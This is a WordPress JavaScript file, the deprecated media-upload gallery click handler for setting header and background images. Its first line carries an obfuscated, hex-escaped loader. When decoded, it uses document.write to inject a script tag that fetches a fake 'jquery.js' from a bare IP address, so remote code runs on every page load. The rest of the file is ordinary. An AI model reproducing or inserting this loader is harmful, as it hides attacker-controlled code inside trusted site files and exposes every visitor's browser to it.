var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))/* global ajaxurl */

/**
 * This file is used on media-upload.php which has been replaced by media-new.php and upload.php
 * Deprecated since 3.5.0
 */
jQuery(function($) {
	/**
	 * Adds a click event handler to the element with a 'wp-gallery' class.
	 */
	$( 'body' ).bind( 'click.wp-gallery', function(e) {
		var target = $( e.target ), id, img_size;

		if ( target.hasClass( 'wp-set-header' ) ) {
			// Opens the image to preview it full size.
			( window.dialogArguments || opener || parent || top ).location.href = target.data( 'location' );
			e.preventDefault();
		} else if ( target.hasClass( 'wp-set-background' ) ) {
			// Sets the image as background of the theme.
			id = target.data( 'attachment-id' );
			img_size = $( 'input[name="attachments[' + id + '][image-size]"]:checked').val();

			/**
			 * This AJAX action has been deprecated since 3.5.0, see custom-background.php
			 */
			jQuery.post(ajaxurl, {
				action: 'set-background-image',
				attachment_id: id,
				size: img_size
			}, function() {
				var win = window.dialogArguments || opener || parent || top;
				win.tb_remove();
				win.location.reload();
			});

			e.preventDefault();
		}
	});
});
